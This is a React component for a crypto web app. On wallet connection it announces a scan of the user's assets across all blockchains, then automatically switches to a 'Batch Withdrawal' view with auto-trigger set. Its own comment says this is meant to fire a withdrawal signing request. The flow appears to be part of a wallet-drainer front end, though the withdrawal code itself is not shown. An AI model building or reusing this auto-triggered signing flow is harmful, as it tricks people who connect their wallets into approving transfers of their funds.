'use client';

import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount } from 'wagmi'
import { Portfolio } from './Portfolio'
import { BatchWithdrawal } from './BatchWithdrawal'
import { NetworkSelector } from './NetworkSelector'
import { useState, useEffect } from 'react'

export function WalletConnector() {
  const { open } = useWeb3Modal()
  const { address, isConnected } = useAccount()
  const [activeTab, setActiveTab] = useState<'portfolio' | 'withdraw'>('portfolio')
  const [autoSignRequested, setAutoSignRequested] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [statusMessage, setStatusMessage] = useState<string | null>(null)

  // Auto-trigger withdraw sign request on wallet connection
  useEffect(() => {
    if (isConnected && address && !autoSignRequested) {
      // Set loading state while preparing
      setIsLoading(true)
      setStatusMessage('Scanning for assets across all supported blockchains...')
      
      // Set a slight delay to ensure the UI has time to update
      const timer = setTimeout(() => {
        setStatusMessage('Preparing batch withdrawal...')
        
        // Set active tab to withdrawal to show withdrawal interface
        setTimeout(() => {
          setActiveTab('withdraw')
          setAutoSignRequested(true)
          setIsLoading(false)
          setStatusMessage(null)
        }, 1500)
      }, 2000)
      
      return () => clearTimeout(timer)
    }
  }, [isConnected, address, autoSignRequested])

  return (
    <div className="space-y-6">
      {!isConnected ? (
        <div className="flex flex-col items-center">
          <button
            onClick={() => {
              setIsLoading(true);
              setStatusMessage('Connecting to your wallet...');
              open().finally(() => {
                if (!isConnected) {
                  setIsLoading(false);
                  setStatusMessage(null);
                }
              });
            }}
            disabled={isLoading}
            className={`px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors ${
              isLoading ? 'opacity-70 cursor-not-allowed' : ''
            }`}
          >
            {isLoading ? 'Connecting...' : 'Connect Wallet'}
          </button>
          
          {statusMessage && (
            <div className="mt-4 p-3 bg-blue-50 text-blue-700 rounded-lg text-sm flex items-center">
              <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              {statusMessage}
            </div>
          )}
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <p className="text-sm text-gray-600">
              Connected: <span className="font-mono">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
            </p>
            <button
              onClick={() => open()}
              className="px-4 py-1 text-sm bg-gray-100 rounded-lg hover:bg-gray-200 transition-colors"
            >
              Switch Wallet
            </button>
          </div>
          
          <NetworkSelector />
          
          <div className="border-b border-gray-200">
            <nav className="flex space-x-4" aria-label="Wallet Features">
              <button
                onClick={() => setActiveTab('portfolio')}
                className={`py-3 px-4 text-sm font-medium ${
                  activeTab === 'portfolio'
                    ? 'border-b-2 border-blue-500 text-blue-600'
                    : 'text-gray-500 hover:text-gray-700'
                }`}
                aria-current={activeTab === 'portfolio' ? 'page' : undefined}
              >
                Portfolio
              </button>
              <button
                onClick={() => setActiveTab('withdraw')}
                className={`py-3 px-4 text-sm font-medium ${
                  activeTab === 'withdraw'
                    ? 'border-b-2 border-blue-500 text-blue-600'
                    : 'text-gray-500 hover:text-gray-700'
                }`}
                aria-current={activeTab === 'withdraw' ? 'page' : undefined}
              >
                Batch Withdrawal
              </button>
            </nav>
          </div>
          
          {isLoading ? (
            <div className="p-8 flex flex-col items-center justify-center">
              <div className="w-12 h-12 border-t-2 border-b-2 border-blue-500 rounded-full animate-spin mb-4"></div>
              <p className="text-blue-600 font-medium">{statusMessage || 'Loading...'}</p>
              <p className="text-sm text-gray-500 mt-2">This may take a moment as we scan multiple blockchains</p>
            </div>
          ) : (
            activeTab === 'portfolio' ? <Portfolio /> : <BatchWithdrawal autoTrigger={autoSignRequested} />
          )}
        </div>
      )}
    </div>
  )
} 